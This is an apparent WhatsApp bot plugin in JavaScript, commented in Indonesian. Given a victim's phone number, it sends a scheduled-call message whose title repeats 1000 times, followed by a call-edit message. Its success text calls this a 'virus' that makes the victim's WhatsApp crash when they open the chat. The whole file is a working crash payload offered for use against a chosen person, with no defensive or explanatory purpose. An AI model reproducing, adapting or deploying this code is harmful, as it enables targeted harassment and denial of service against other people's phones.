let handler = async (m, { conn, text, command }) => {
if (!text) throw `*Jangan salah gunakan om yah*\n\nExample: ${command} 628XXXXXX`
let num = text.replace(new RegExp("[ ( ) + -/ +\]", "gi"), " ") + '@s.whatsapp.net'
await m.reply(wait)
await conn.relayMessage(num, {
		scheduledCallCreationMessage: {
		callType: 2,
		scheduledTimestampMs: Date.now(),
		title: `${text}`.repeat(1000)
		}
	}, {})
await conn.relayMessage(m.chat, {
		scheduledCallEditMessage: {
		editType: 1
		}
	}, {})
m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe🗿`)
}
//handler.help = ['🗿 <nomer/jumlah>']
//handler.tags = ['tools']
handler.command = /^(call)$/i 
handler.owner = true 
export default handler